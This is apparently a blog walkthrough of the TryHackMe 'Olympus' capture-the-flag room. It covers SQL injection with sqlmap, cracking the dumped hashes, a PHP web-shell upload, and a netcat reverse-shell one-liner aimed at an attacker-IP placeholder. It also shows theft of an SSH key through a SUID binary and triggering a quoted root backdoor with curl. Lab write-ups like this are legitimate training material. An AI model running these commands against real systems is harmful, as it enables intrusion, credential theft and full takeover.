---
title: "TryHackMe: Olympus"
date: 19 Jul 2022 @ 0707
excerpt_separator: "<!--more-->"
categories:
  - Walkthrough
tags:
  - Linux
  - enumeration
  - vhost
  - sqli
---

# Summary
Olympus was a **MEDIUM** difficulty room on [TryHackMe](https://tryhackme.com/room/olympusroom) that required careful enumeration at the beginning and throughout the challenge to find the way ahead. After some directory bruteforcing, we find a site that is vulnerable to SQL injection which allows us to dump the content of the backend database to gain credentials. Using those credentials, we're able to log into a subdomain and abuse a file upload functionality to get a web shell on the server. Leveraging that web shell we can get an initial foothold on the machine, and elevate to user by exploiting a SUID binary. Once we have access as the user, we can perform some careful enumeration on the box and some PHP source code analysis to get a reverse shell as root. Finally, we can perform some searching with REGEX to find the bonus flag. 

# Walkthrough
## Enumeration
### Nmap
Nmap shows there are only two ports open, 22 and 80. SSH is typically pretty secure against attacks anyway, and this server appears to be running a pretty recent version of OpenSSH, so we'll leave that alone for now. 

```bash
$ sudo nmap -sC -sV -p- -vv -oA nmap/$name $ip

[...]
Nmap scan report for 10.10.150.21
Host is up, received reset ttl 61 (0.19s latency).
Scanned at 2022-07-17 07:46:04 CDT for 565s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[...]
```

### Website
Checking out the website we get an "Under construction" message. However, the message does indicate that the old version of the website is still available somewhere on this domain. Let's see if we can find it. 

![](/assets/images/Pasted%20image%2020220717074903.png)

### Fuzzing
```bash
$ ffuf -c -u http://olympus.thm/FUZZ -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt                              

[...]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 1946, Words: 238, Lines: 48]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10]
[...]
```

There's a directory `~webmaster` that returns a 301 HTTP code ("Moved Permanently"). Chekcing that out reveals a blog of some sort titled "Victor's CMS". 

![](/assets/images/Pasted%20image%2020220717075646.png)

## SQL Injection
After poking around the site for a bit, we find a `category.php` page that looks like it might be making a call to a backend database. We can run that through `sqlmap` to see if anything comes back. 

```bash
$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' --dbs                     

[...]

[07:58:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0.12
[07:58:19] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

[...]
```

Awesome! So the `cat_id` parameter was vulnerable to SQL injection, and we can now read data out of the back-end database. Keep in mind that with `sqlmap`, it's possible to enumerate databases, tables, and columns using the following options:

- Use `--dbs` to enumerate the database names. Once you have the database you want to use, you can specify it on the command line with the `-D <DB NAME>` option. 
- Use `--tables` to enumerate table names. Specify tables on the command line with `-T <TABLE NAME>`
- Use `--columns` to enumerate column names within a table. Specify columns with `-C <COLUMN NAME>`. 
- You can also dump the entire table useing `--dump`. 

>**NOTE:** The search field is also vulnerable to SQLi. 

### Flag #1
When we dig into the `olympus` database, we can see there's a table named `flag` there. We can dump that table to get the contents of Flag #1. 

```bash
sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T flag --dump 

[...]
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{REDACTED} |
+---------------------------+

[...]
```

```bash
$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T users -C user_name,user_password --dump

Database: olympus
Table: users
[3 entries]
+------------+--------------------------------------------------------------+
| user_name  | user_password                                                |
+------------+--------------------------------------------------------------+
| prometheus | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C |
| root       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK |
| zeus       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC |
+------------+--------------------------------------------------------------+
```

## Cracking
Now we can grab those hashes we dumped from the `olympus` database and drop them into a file with the associated usernames as follows:

```text
prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```

Using `hashid`, we find that the john format for these hashes is `bcrypt`, so we'll use that in the `john` command. 

```bash
$ john --wordlist=/opt/wordlists/rockyou.txt --format=bcrypt creds.txt

[...]

<REDACTED>      (prometheus)     

[...]
```

John quickly cracks the password for the `prometheus` users. We can now log into the website with those credentials. That drops us onto an admin page. 

![](/assets/images/Pasted%20image%2020220717084451.png)

After testing all the functionality on this page, it seems like this is a bit of a rabbit hole. 

> **NOTE:** The first time I did this box, I used this way in...which was subsequently patched as an unintended path. 

## Further enumeration
There must be another way in. Let's recheck subdomains and see if there's any other functionality on this domain. 

```bash
$ ffuf -c -u http://FUZZ.olympus.thm -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt 

[...]

chat                    [Status: 302, Size: 0, Words: 1, Lines: 1]

[...]
```

Awesome, there's a chat page we can look at. 

![](/assets/images/Pasted%20image%2020220717111208.png)

The credentials we found earlier for `prometheus` work to log in here, and we're greeted with the "Olympus Chat App". 

![](/assets/images/Pasted%20image%2020220717111338.png)

There's a file upload functionality on this page, but reading the chat messages it's clear that the application uses a random name function to rename the files when they're uploaded. Since we don't know what that function is, we'll have to dig a little bit more. 

If you recall, when we enumerated the backend database, there was a table named `chats`. Let's check that to see if there's any information that might be useful. 

```bash
$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus --tables

[...]
Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
[...]
```

When we dump that table, it looks like there's filenames stored there! 

```bash
$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T chats --dump

[...]
| 2022-04-05 | Attached : prometheus_password.txt | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
[...]
```

Now we just need to figure out if there are any filters in place that would prevent us from uploading a web shell to the server. **SPOILER ALERT: There aren't!**

>**NOTE:** I originally intened this to show how to use Burp to test for file upload filters, but since there weren't any it became just another way to get a web shell on the box. This is probably the "hard" way. Since there are no filters in place, you *could* just upload a full PHP reverse shell to the server, access that and get a reverse shell from there. But...I didn't. 

To get a webshell on server, uploaded a normal image using the file upload functionality on the chat page, intercepted the request with Burp and sent the request to the Burp Repeater. In the repeater tab I did the following:

![](/assets/images/Pasted%20image%2020220717113111.png)

1. Change the filename to `shell.php`
2. Chage the Content-Type from `image/jpeg` to `application/x-php`
3. Deleted the image content and added the PHP code for a basic web shell. 

Now, rechecking the `chats` table, we can see the filename for our recently uploaded shell

```bash
$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T chats --dump

[...]
| 2022-07-17 | Attached : shell.php | 1b3093a1fca202e92445397dc4cc8c85.php | prometheus |
[...]
```

Now that we have the filename, we can test to see if it's working properly. 

```bash
$ curl 'http://chat.olympus.thm/uploads/1b3093a1fca202e92445397dc4cc8c85.php?cmd=id'

uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
```

Super. It's working just fine and we now have remote code execution on the machine. We can use this access to get a reverse shell and move forward. 

We're going to use the old standby reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <ATTACKER IP> <LISTEN PORT> >/tmp/f
```

Make sure to URL-encode the payload and start up a netcat listener on your attackbox before sending the request. 

```bash
$ curl 'http://chat.olympus.thm/uploads/1b3093a1fca202e92445397dc4cc8c85.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20<ATTACKER IP>%20<LISTEN PORT>%20%3E%2Ftmp%2Ff'
```

>**NOTE:** You could also send this request in a web browser if it's easier for you. 

![](assets/images/Pasted%20image%2020220717114938.png)
After stabilizing that shell we can do some enumeration and figure out how to move from `www-data` to a normal user. Looking at the `/home` directory and `/etc/passwd`, it looks like our user will be `zeus`...which makes sense because we also saw that user in the MySQL database. 

## Escalate To User
Feel free to run whatever privesc script you want (e.g., LinPEAS, LinEnum, etc.) but for the purposes of this walkthrough, I'll just cut to the relevant area. 

When we enumerate binaries with the SUID bit set, we see there's an interesting one that doesn't appear on most systems. 

```bash
$ find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null

[...]
-rwsr-xr-x 1 zeus zeus 17728 Apr 18 09:27 /usr/bin/cputils
[...]
```

To check how this binary behaves, we can try running it and following the prompts to copy a file from one place to another. I'm going to try copying the `/etc/passwd` file to the `/dev/shm` directory, since that directory is typically writable and we shouldn't run into any issues copying the file there. 

```bash
$ /usr/bin/cputils

[...]
-rw-r--r--  1 zeus www-data 1877 Jul 17 16:59 passwd
[...]
```

That's interesting. Notice that the file in the new location is owned by `zeus` and is readable by the `www-data` user (the user that invoked the command). We can likely use this command to read files belonging to `zeus` that we ordinarily wouldn't be able to read. Let's try to grab the `id_rsa` file out of `zeus`'s home directory. 

```bash
$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /dev/shm/id_rsa

File copied successfully.
```

Great! Let's check this out. 

```bash
$ cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2
NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2i
[REDACTED]
-----END OPENSSH PRIVATE KEY-----
```

Perfect...now copy that key out to your attacker machine. I named the file zeus.key, but anything will work. Make sure to change the permissions on the key with `chmod 600 <KEY FILE>`. 

```bash
$ ssh -i zeus.key zeus@$ip

Enter passphrase for key 'zeus.key': 
```

Looks like the key requires a passphrase. We can use `ssh2john` to get the key into a format `John the Ripper` can handle. 

```bash
$ python3 /opt/john/run/ssh2john.py zeus.key > zeus.hash
```

>**NOTE:** Depending on your distribution and how you have `john` installed, your command may be slightly different than mine. 

Now that we've got it in a good format, we can try using `john` to crack the hash. 

```bash
$ john --wordlist=/opt/wordlists/rockyou.txt zeus.hash

[...]
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
REDACTED       (zeus.key)     
1g 0:00:00:48 DONE (2022-07-17 12:14) 0.02072g/s 31.17p/s 31.17c/s 31.17C/s maurice..bunny
[...]
```

The hash will crack in a minute or two and we should now be able to ssh into the machine as the `zeus` user. 

```bash
$ ssh -i zeus.key zeus@$ip
Enter passphrase for key 'zeus.key': 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 17 Jul 2022 05:15:11 PM UTC

  System load:  0.08              Processes:             122
  Usage of /:   43.4% of 9.78GB   Users logged in:       0
  Memory usage: 66%               IPv4 address for eth0: 10.10.132.247
  Swap usage:   0%


33 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


Last login: Sat Jul 16 07:52:39 2022
zeus@olympus:~$ 
```

Now that we're here, go ahead and grab the `user.flag`. 

```bash
zeus@olympus:~$ ls
snap  user.flag  zeus.txt
```

There's also a note `zeus.txt`. It looks like a taunt from Prometheus about being able to hack his way in and establish persistence. Oh, Prometheus. 

```text
zeus@olympus:~$ cat zeus.txt 
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



						- Prometheus.
```

## Escalate to Root
Now we need to escalate our privileges one more time to get root on the machine. Again, feel free to run whatever script you're most comfortable with, but a word of warning, the way ahead **MAY OR MAY NOT** show up in script output. 

For the path to root, we want to identify what files the `zeus` **GROUP** has access to. 

```bash
zeus@olympus:~$ find / -type f -group zeus 2>/dev/null

[...]
/var/www/olympus.thm/public_html/~webmaster/search.php
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
[...]
```

It looks like there are a few interesting files to which the `zeus` group has access. After looking the first two over and not finding anything too interesting, let's focus on the third. 

```php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

[...]
```

Alright...it looks like this is a root backdoor! This must be what Prometheus was blabbering about. Let's try to breakdown what's happening here in the first few lines of this code.

>**Disclaimer:** I am by no means a professional PHP developer, so sorry if my explanation is a little off. 

So it looks like this application is listening for an HTTP POST request with the password in the body of the request, and the target (in this case, the attacker's) IP and PORT as GET parameters. We can leverage this backdoor with the following command.

```bash
$ curl -X POST "http://$ip/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=<ATTACKER IP>&port=<LISTEN PORT>" -H "Content-Type: application/x-www-form-urlencoded" -d "password=a7c5ffcf139742f52a5267c4a0674129"
```

>**NOTE:** This can also be done by visiting the site in a web browser. I used curl for ease of illustration, but a browser would work just fine. You'll still have to include the attacker IP and listening port in the query string though. 

Which gets us a root shell!

```bash
Connection received on 10.10.132.247 49626
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 17:36:46 up  1:32,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/1    10.13.37.33      17:15   11:02   0.03s  0.03s -bash
id
uid=0(root) gid=0(root) groups=0(root),33(www-data),7777(web)

```

Now that we're root on the machine, we can stabilize this shell and grab the root flag. 

```bash
$ cat root.flag
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./          




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{REDACTED}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)

```

Prometheus, you're killin' me. 

## Bonus Flag
The root flag suggested using regex to find the bonus flag. I'm going to use a simple `grep` command with some options to find the bonus flag. Using the hint provided in the room, we know that the bonus flag is somewhere in the `/etc` directory. We also know the flags have the format `flag{s0m3th1ng}`. We can use those two pieces of information to construct the query. 

```bash
root@olympus:~# grep -irl flag{ /etc/

/PATH/IS/REDACTED
```

We can break this command down quickly before you grab that flag and finish the room. 

- The `-i` option tells grep to ignore case
- The `-r` option tells grep to search recursively
- And the `-l` option tells grep to suppress normal output and instead print the name of each input file from which output would normally have been printed.

Now...go grab the flag and finish up the room! 
